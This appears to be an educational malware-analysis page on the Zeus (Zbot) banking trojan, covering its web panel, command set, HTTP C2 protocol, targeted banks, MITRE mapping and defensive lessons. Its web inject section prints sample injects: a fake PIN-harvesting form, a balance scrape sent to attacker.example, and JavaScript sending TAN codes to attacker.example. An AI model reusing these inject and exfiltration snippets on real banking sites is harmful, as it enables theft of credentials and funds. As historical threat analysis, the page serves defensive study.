---
title: "Zeus (Zbot) Banking Trojan"
description: "The notorious HTTP-based banking trojan - web panel, web injects, Man-in-the-Browser attacks, and the paradigm shift from IRC to HTTP C2 (2007-2011)"
---

Zeus (also known as **Zbot**) is the most financially significant malware specimen in the archived collection. Unlike the IRC-based bot families that dominate the archive, Zeus represents a **fundamentally different paradigm** - HTTP-based command and control, browser hooking for real-time transaction manipulation, and a commercially sold crimeware kit with a full web administration panel.

The FBI estimated Zeus caused **$100 million+ in losses** in the United States alone. Its source code leak in 2011 spawned an entire generation of banking trojans.

> **Educational context:** This analysis is based on static source-code inspection of historical specimens. All source references link to the [maestron/botnets](https://github.com/maestron/botnets) public archive.

---

## Architecture Overview

Zeus is a **modular crimeware toolkit** - not a single binary, but a complete ecosystem of components designed to work together.

| Component | Purpose | Technology |
|-----------|---------|------------|
| **Builder** | Compiles bot binary + encodes configuration | C++ (Win32) |
| **Bot Binary** | The malware payload installed on victims | C++ (no external libraries) |
| **Config (text)** | Human-readable configuration file | Custom syntax |
| **Config (binary)** | RC4-encrypted compiled configuration | Binary blob |
| **Web Panel** | Command-and-control administration interface | PHP/MySQL |
| **Gate** | HTTP bot check-in endpoint | PHP |
| **BackConnect Server** | Reverse tunnel for SOCKS/RDP access to victims | C++/PHP |
| **Web Injects** | HTML/JS injection rules for MitB attacks | Custom DSL |

### Deployment Workflow

```
Step 1: Set up server with PHP + MySQL
Step 2: Install web panel (PHP application)
Step 3: Edit config.txt (C2 URLs, web injects, targets)
Step 4: Run builder → generates config.bin + bot.exe
Step 5: Distribute bot.exe via exploit kits / spam campaigns
Step 6: Victims check in to gate.php → appear in web panel
Step 7: Operator manages botnet via web GUI
```

[View source - Zeus](https://github.com/maestron/botnets/tree/master/VirusPack)

---

## Web Panel Analysis (v1.2.5.1)

The Zeus web panel is a **full-featured PHP/MySQL application** with sophisticated access controls - more comparable to a legitimate SaaS admin panel than to the IRC clients used by other bot families.

### Authentication & Authorization

| Feature | Implementation |
|---------|---------------|
| Session management | PHP session-based with cookie persistence |
| Password hashing | MD5 (standard for the era) |
| Access control | Granular role-based - **15+ per-user permission flags** |
| Multi-user | Multiple operators with different privilege levels |

### Panel Modules

| Section | Description | Key Features |
|---------|-------------|-------------|
| **Statistics** | Botnet dashboard | Installs by country, OS distribution, infection timeline |
| **Botnet → Bots** | Bot inventory | Rich filtering: bot ID, botnet name, IP, country, NAT status, online status |
| **Botnet → Scripts** | Command deployment | Target by bot ID whitelist/blacklist, botnet name, country codes, send limits |
| **Reports → DB** | Stolen data search | Filter by date range, data type (HTTP/HTTPS/FTP/POP3/form-grabbed) |
| **Reports → Files** | File browser | Browse files uploaded from victim machines |
| **System** | Administration | User management, system options, server diagnostics |

### Bot Command Set

Zeus exposed a comprehensive command set through the Scripts interface:

| Command | Function | Category |
|---------|----------|----------|
| `reboot` | Reboot victim machine | System control |
| `kos` | Kill operating system (BSOD trigger) | Destructive |
| `shutdown` | Shut down victim machine | System control |
| `bc_add` | Add backconnect tunnel (SOCKS/RDP) | Remote access |
| `block_url` | Block victim access to specified URLs | Browser control |
| `unblock_url` | Remove URL block | Browser control |
| `rexec` | Remote execute - download and run arbitrary file | Payload delivery |
| `getfile` | Upload specified file from victim to panel | Data theft |
| `getcerts` | Extract and upload SSL certificates | Credential theft |
| `resetgrab` | Reset form grabber state | Maintenance |
| `upcfg` | Update bot configuration remotely | Management |
| `rename_bot` | Change bot's identifier | Management |
| `sethomepage` | Change victim's browser homepage | Browser control |

### Script Targeting

Commands could be precisely targeted:

```
// Pseudocode - Zeus script targeting options
target_options = {
    bot_id_whitelist: ["BOT001", "BOT002"],  // Only these bots
    bot_id_blacklist: ["BOT099"],             // Not this bot
    botnet_name: "campaign_2009_q3",          // Specific campaign
    country_codes: ["US", "UK", "DE"],        // Geographic targeting
    max_sends: 1000,                          // Rate limiting
    send_once: true                           // Execute only once per bot
}
```

---

## Web Inject System - Man-in-the-Browser

The web inject system is Zeus's **most significant innovation** and the feature that made it the dominant banking trojan of its era.

### How It Works

Zeus hooks `wininet.dll` at the Windows API level, inserting itself into the chain between **SSL decryption and page rendering**. This means it modifies HTTPS bank pages *after* decryption but *before* the user sees them - defeating SSL encryption entirely from the user's perspective.

```
Normal flow:
  Bank server → [HTTPS] → Browser decrypts → User sees page

Zeus flow:
  Bank server → [HTTPS] → Browser decrypts → Zeus modifies → User sees modified page
```

### Inject Configuration Syntax

Web injects are defined using a custom domain-specific language:

```
set_url https://www.examplebank.com/login* GP
data_before
<div id="login-form">
data_end
data_inject
<div class="security-notice">
  <p>For your security, please also enter your ATM PIN:</p>
  <input type="text" name="atm_pin" />
  <p>Mother's maiden name:</p>
  <input type="text" name="maiden_name" />
</div>
data_end
data_after
</div>
data_end
```

**Syntax breakdown:**

| Directive | Purpose |
|-----------|---------|
| `set_url [pattern] [flags]` | URL pattern to match. Flags: `G`=GET, `P`=POST, `L`=Log all data |
| `data_before` | HTML pattern to locate injection point (marker in original page) |
| `data_inject` | HTML/JS content to inject at the located point |
| `data_after` | HTML pattern marking end of injection zone |

### Attack Types Observed in Archived Configs

#### 1. Balance Scraping
Silently captures account summary data without modifying the page - the user sees nothing unusual.

```
set_url https://www.examplebank.com/accounts/summary* GL
data_before
<td class="balance">
data_end
data_inject
<img src="https://attacker.example/gate.php?bal=
data_end
data_after
</td>
data_end
```

#### 2. Extra Field Injection
Adds fake form fields that appear native to the bank's interface:

- ATM PIN request
- Security question harvesting
- Social Security Number request
- Date of birth collection

#### 3. TAN/Signing Key Theft
Targets European banks that use Transaction Authentication Numbers:

```
set_url https://www.eurobank.example/transfer* GP
data_before
<input name="tan_code"
data_end
data_inject
<script>
  // Pseudocode - intercept TAN entry
  document.forms[0].onsubmit = function() {
      var tan = document.querySelector('[name=tan_code]').value;
      new Image().src = 'https://attacker.example/log.php?tan=' + tan;
  }
</script>
data_end
data_after
/>
data_end
```

#### 4. Page Replacement
Completely replaces the bank's page with an attacker-controlled version - used for complex multi-step social engineering attacks.

---

## Targeted Financial Institutions

The archived configuration files reveal extensive institutional targeting across multiple countries:

### United States
| Institution | Attack Type |
|-------------|------------|
| Bank of America | Balance scraping + extra fields |
| Wells Fargo | Form grabbing + field injection |
| Washington Mutual (WaMu) | Full page inject |
| Chase | Balance + credential theft |
| Citibank | Multi-field injection |
| US Bank | Form grabbing |
| SunTrust | Balance scraping |

### United Kingdom
| Institution | Attack Type |
|-------------|------------|
| Barclays | Balance + security questions |
| Lloyds TSB | TAN interception |
| HSBC | Form grabbing + field injection |
| NatWest | Multi-step inject |
| Halifax | Balance scraping |

### Spain (Extensive Targeting)
| Institution | Notes |
|-------------|-------|
| Santander | Primary target with detailed injects |
| BBVA | Multi-page inject chain |
| Banesto | Form grabbing |
| Banco Popular | Balance scraping |
| Regional Cajas | Dozens of smaller savings banks targeted |

### Germany
| Institution | Attack Type |
|-------------|------------|
| Citibank DE | TAN theft |
| Norisbank | Field injection |
| DAB Bank | Balance scraping |

### Other Targets
| Target | Category |
|--------|----------|
| PayPal | Payment platform |
| eBay | E-commerce credentials |
| E-Gold | Digital currency |
| TD Canada Trust | Canadian banking |

---

## C&C Protocol - HTTP-Based

### Gate Protocol

Zeus replaced IRC with **stateless HTTP POST** communication:

```
Bot → gate.php (HTTP POST)
  ├── Body: RC4-encrypted binary payload
  ├── Format: TLV (Type-Length-Value)
  ├── Integrity: MD5 hash verification
  └── Content types:
       ├── Script execution reports
       ├── Log/file uploads (stolen data)
       └── Online heartbeat (periodic check-in)

gate.php → Bot (HTTP Response)
  └── Pending commands in same encrypted TLV format
```

### Data Types Captured

| Data Type | Collection Method |
|-----------|------------------|
| Protected Storage | Windows credential store dump |
| IE Cookies | Browser cookie extraction |
| Arbitrary files | Targeted file upload via `getfile` |
| HTTP/HTTPS requests | Form grabber (all POST data) |
| FTP credentials | Traffic interception |
| POP3 credentials | Traffic interception |
| Form-grabbed UI data | Win32 UI element scraping |
| Winsock data | Raw socket interception |

### Supporting Infrastructure

| Endpoint | Function |
|----------|----------|
| `gate.php` | Primary bot check-in and data upload |
| `redir.php` | Multi-layer proxy forwarding for operational security |
| `sockslist.php` | Exports list of bot SOCKS proxies for secondary use |
| `ip.php` | External IP detection service for NAT-ed bots |

---

## The IRC-to-HTTP Paradigm Shift

Zeus represents the **most significant architectural shift** in botnet history - the move from IRC-based to HTTP-based command and control. This comparison illuminates why HTTP won.

| Aspect | IRC Botnets (rBot/sdBot) | Zeus (HTTP) |
|--------|--------------------------|-------------|
| **Protocol** | Persistent IRC connection | Stateless HTTP POST polling |
| **Detection** | IRC on non-standard ports - easily blocked by firewalls | Blends with normal web traffic on ports 80/443 |
| **Scalability** | Limited by IRC server capacity (~10K connections) | Web servers handle 100K+ periodic requests |
| **Encryption** | Usually none (Blowfish in later variants) | RC4 + MD5 on all payloads from day one |
| **Data handling** | Unstructured IRC messages (text-based) | Structured MySQL database, searchable via web panel |
| **Administration** | Command-line via IRC client | Full web GUI with role-based access control |
| **Targeting** | Broad (DDoS, spam, scan) | Precise (bank-specific injects, per-country scripts) |
| **Persistence model** | Always-connected (conspicuous) | Periodic polling (stealthy) |
| **Firewall evasion** | IRC ports often blocked | HTTP/HTTPS ports almost never blocked |
| **Takedown** | Kill IRC server → botnet offline | Must identify and seize web infrastructure |

### Why This Shift Mattered

The move to HTTP C2 was not merely a protocol change - it reflected a fundamental shift in the **economics of cybercrime**:

1. **From vandalism to profit** - IRC bots were primarily used for DDoS and spam; Zeus was built for direct financial theft
2. **From mass to targeted** - IRC bots sprayed the same attack at everyone; Zeus delivered bank-specific attacks per institution
3. **From amateur to professional** - IRC C2 required IRC knowledge; Zeus's web panel made operation accessible to anyone
4. **From one-time to ongoing** - IRC bots were often use-and-discard; Zeus configurations could be updated remotely, maintaining long-term victim compromise

---

## Config Builder

The Zeus builder was a Win32 application that:

1. Reads the human-readable `config.txt`
2. Parses web inject rules, C2 URLs, and bot settings
3. Compiles everything into an RC4-encrypted `config.bin`
4. Optionally patches the config into the bot binary

This separation meant operators could **update bot behavior without recompiling the bot** - simply deploying a new `config.bin` via the `upcfg` command changed targeting, web injects, and C2 infrastructure.

```
// Pseudocode - config.txt structure
url_config "https://c2server.example/config.bin"
url_compip "https://c2server.example/ip.php"

entry "StaticConfig"
  botnet "campaign_name"
  timer_config 60        // Config check interval (minutes)
  timer_logs 1           // Log upload interval (minutes)
  timer_stats 20         // Statistics interval (minutes)
end

// Web inject rules follow...
```

---

## Historical Significance

### Scale of Impact

| Metric | Value |
|--------|-------|
| Estimated US losses | $100M+ (FBI estimate) |
| Peak infected machines | Millions worldwide |
| Major law enforcement op | Operation Trident Breach (2010) - 100+ arrests |
| Developer bounty | Evgeniy Bogachev - **$3M FBI reward** (largest for cybercriminal) |

### The 2011 Source Leak

When Zeus's complete source code leaked publicly in 2011, it spawned an entire generation of derivative banking trojans:

| Derivative | Innovation Over Zeus |
|-----------|---------------------|
| **Citadel** | Video capture, AES encryption, developer community forum |
| **ICE IX** | Improved evasion, anti-tracker features |
| **GameOver Zeus** | P2P C2 (borrowed concept from Phatbot), DGA |
| **KINS / ZeusVM** | VMProtect-based binary protection |
| **Sphinx** | Tor-based C2 infrastructure |

Each derivative built upon Zeus's core architecture while adding new evasion or capability layers - demonstrating how source code leaks accelerate threat evolution.

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Zeus Implementation |
|---|---|---|
| T1185 | Browser Session Hijacking | wininet.dll hooking for MitB |
| T1055 | Process Injection | Browser process injection |
| T1071.001 | Application Layer Protocol: Web | HTTP POST C2 via gate.php |
| T1573.001 | Encrypted Channel: Symmetric Crypto | RC4 encryption on all C2 traffic |
| T1056.001 | Input Capture: Keylogging | Form grabber captures all input |
| T1539 | Steal Web Session Cookie | Cookie extraction module |
| T1555 | Credentials from Password Stores | Protected Storage dump |
| T1005 | Data from Local System | Arbitrary file theft via `getfile` |
| T1102.001 | Web Service: Dead Drop | Config file hosted on separate URL |
| T1105 | Ingress Tool Transfer | `rexec` command for payload delivery |
| T1090 | Proxy | SOCKS proxy via backconnect module |

---

## Defensive Lessons

The Zeus era drove several major advances in defensive security:

1. **Browser hardening** - Banks began deploying dedicated secure browsers and browser plugins to detect API hooking
2. **Transaction verification** - Out-of-band transaction confirmation (SMS, hardware tokens) to defeat MitB attacks
3. **Behavioral analytics** - Bank-side detection of anomalous login patterns, unusual transfer targets, and geographic impossibilities
4. **Threat intelligence sharing** - Financial sector ISACs (Information Sharing and Analysis Centers) were strengthened to share Zeus indicators
5. **Takedown coordination** - Multi-national law enforcement cooperation became essential (Operation Trident Breach involved the FBI, UK, Ukraine, and Netherlands)

---

## Source Code References

- [View VirusPack collection](https://github.com/maestron/botnets/tree/master/VirusPack)
- [View full repository](https://github.com/maestron/botnets)

:::caution[Disclaimer]
This page is produced for **educational and academic purposes only**. The source code described here is analyzed statically for research into historical malware evolution. No executable binaries are provided or endorsed.
:::
